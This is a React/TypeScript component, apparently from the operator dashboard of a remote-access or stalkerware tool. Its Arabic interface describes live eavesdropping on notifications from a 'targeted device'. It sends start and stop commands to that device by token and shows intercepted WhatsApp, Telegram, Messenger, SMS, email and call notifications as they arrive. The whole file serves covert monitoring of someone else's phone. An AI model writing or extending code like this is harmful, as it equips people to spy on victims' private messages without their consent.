import { useState, useEffect, useRef } from 'react';
import { sendCommand } from '../../../services/api';
import { onSocketEvent } from '../../../services/socket';
import { Card } from '../../ui/Card';
import { Button } from '../../ui/Button';
import { Bell, BellOff, Trash2, MessageSquare, Phone, Mail, Globe } from 'lucide-react';

interface Props { token: string }

interface ParsedNotification {
  appName: string;
  title: string;
  text: string;
  timestamp: number | null;
}

const APP_STYLES: Record<string, { color: string; bg: string; label: string; icon: string }> = {
  whatsapp: { color: '#25D366', bg: '#E8F9EE', label: 'واتساب', icon: '💬' },
  messenger: { color: '#00B2FF', bg: '#E5F7FF', label: 'ماسنجر', icon: '💬' },
  facebook: { color: '#1877F2', bg: '#E8F1FC', label: 'فيسبوك', icon: '📘' },
  instagram: { color: '#E1306C', bg: '#FDE8ED', label: 'إنستغرام', icon: '📷' },
  snapchat: { color: '#FFB300', bg: '#FFF8E1', label: 'سناب شات', icon: '👻' },
  telegram: { color: '#0088CC', bg: '#EDF8FD', label: 'تيليجرام', icon: '✈️' },
  youtube: { color: '#FF0000', bg: '#FEECEE', label: 'يوتيوب', icon: '▶️' },
  gmail: { color: '#EA4335', bg: '#FCE8E6', label: 'البريد الإلكتروني', icon: '📧' },
  android: { color: '#3DDC84', bg: '#EBFBF3', label: 'نظام أندرويد', icon: '🤖' },
  dialer: { color: '#4CAF50', bg: '#E8F5E9', label: 'مكالمة هاتفية', icon: '📞' },
  phone: { color: '#4CAF50', bg: '#E8F5E9', label: 'مكالمة هاتفية', icon: '📞' },
  sms: { color: '#007AFF', bg: '#E6F2FF', label: 'الرسائل', icon: '💌' },
  message: { color: '#007AFF', bg: '#E6F2FF', label: 'الرسائل', icon: '💌' },
};

function getAppStyle(pkg: string) {
  const lower = pkg.toLowerCase();
  for (const [key, style] of Object.entries(APP_STYLES)) {
    if (lower.includes(key)) return style;
  }
  const parts = pkg.split('.');
  const name = parts.length >= 2 ? parts[parts.length - 1] : pkg;
  return { color: '#6366F1', bg: '#EEF2FF', label: name || 'تطبيق', icon: '📱' };
}

function parseNotifications(raw: string[]): ParsedNotification[] {
  const results: ParsedNotification[] = [];
  for (const str of raw) {
    try {
      const startIdx = str.indexOf('[');
      const endIdx = str.lastIndexOf(']');
      if (startIdx !== -1 && endIdx > startIdx) {
        let arrStr = str.substring(startIdx, endIdx + 1);
        if (!arrStr.includes('"')) arrStr = arrStr.replace(/'/g, '"');
        const arr = JSON.parse(arrStr);
        for (const obj of arr) {
          results.push({
            appName: obj['App name'] || obj.package || obj.appName || '',
            title: obj.Title || obj.title || '',
            text: obj.text || obj.Text || obj.message || obj.body || '',
            timestamp: obj.time || obj.timestamp || null,
          });
        }
        continue;
      }
    } catch { /* try single */ }
    try {
      const obj = JSON.parse(str);
      results.push({
        appName: obj['App name'] || obj.package || obj.appName || '',
        title: obj.Title || obj.title || '',
        text: obj.text || obj.Text || obj.message || obj.body || '',
        timestamp: obj.time || obj.timestamp || null,
      });
    } catch {
      results.push({ appName: '', title: '', text: str, timestamp: null });
    }
  }
  return results;
}

export function RealtimeNotificationsListener({ token }: Props) {
  const [isListening, setIsListening] = useState(false);
  const [rawNotifications, setRawNotifications] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const unsub = onSocketEvent('device:update', (data: unknown) => {
      const d = data as { token?: string; notifications?: string[] };
      if (d.token === token && d.notifications) {
        setRawNotifications((prev) => [...d.notifications!, ...prev].slice(0, 200));
      }
    });
    return () => unsub();
  }, [token]);

  const startListening = async () => {
    setLoading(true);
    try {
      await sendCommand(token, 'get_notifications');
      setIsListening(true);
    } catch { /* ignore */ }
    finally { setLoading(false); }
  };

  const stopListening = async () => {
    setLoading(true);
    try {
      await sendCommand(token, 'stop_get_notifications');
      setIsListening(false);
    } catch { /* ignore */ }
    finally { setLoading(false); }
  };

  const parsed = parseNotifications(rawNotifications);

  return (
    <div className="space-y-4">
      {/* Header Card */}
      <Card className="bg-blue-50 dark:bg-blue-500/5 border-blue-200 dark:border-blue-500/20">
        <h3 className="text-sm font-bold text-blue-800 dark:text-blue-300 mb-1">مراقب الإشعارات الفوري</h3>
        <p className="text-xs text-blue-600 dark:text-blue-400 mb-3">
          {isListening ? 'جاري التنصت والاستماع للإشعارات من الجهاز المستهدف...' : 'اضغط على زر البدء لطلب تفعيل التنصت الحي على إشعارات الجهاز.'}
        </p>
        <div className="flex gap-2">
          {!isListening ? (
            <Button size="sm" onClick={startListening} loading={loading} icon={<Bell size={14} />}>بدء تنصت الإشعارات</Button>
          ) : (
            <Button size="sm" variant="danger" onClick={stopListening} loading={loading} icon={<BellOff size={14} />}>إيقاف التنصت</Button>
          )}
          {rawNotifications.length > 0 && (
            <Button size="sm" variant="ghost" onClick={() => setRawNotifications([])} icon={<Trash2 size={14} />}>مسح القائمة</Button>
          )}
        </div>
      </Card>

      {/* Notifications List */}
      {parsed.length === 0 ? (
        <Card className="py-16 text-center">
          <Bell size={32} className="mx-auto mb-3 text-surface-300" />
          <p className="text-sm text-surface-500">لا توجد إشعارات واردة حالياً...</p>
        </Card>
      ) : (
        <div className="space-y-2.5">
          {parsed.map((n, i) => {
            const style = getAppStyle(n.appName);
            return (
              <Card key={i} padding="sm" className="shadow-md">
                <div className="flex items-start gap-3">
                  <div className="w-9 h-9 rounded-full flex items-center justify-center shrink-0 text-lg" style={{ backgroundColor: style.bg }}>
                    {style.icon}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between">
                      <div>
                        <span className="text-sm font-bold" style={{ color: style.color }}>{style.label}</span>
                        {n.appName && n.appName !== style.label && (
                          <p className="text-[10px] text-surface-400 truncate">{n.appName}</p>
                        )}
                      </div>
                      {n.timestamp && (
                        <span className="text-[10px] text-surface-400">
                          {new Date(n.timestamp).toLocaleTimeString('ar', { hour: '2-digit', minute: '2-digit' })}
                        </span>
                      )}
                    </div>
                    <div className="h-px bg-surface-100 dark:bg-surface-800 my-2" />
                    {n.title && <p className="text-sm font-semibold text-surface-900 dark:text-white mb-0.5">{n.title}</p>}
                    {n.text && <p className="text-xs text-surface-600 dark:text-surface-400 leading-relaxed">{n.text}</p>}
                  </div>
                </div>
              </Card>
            );
          })}
        </div>
      )}
    </div>
  );
}
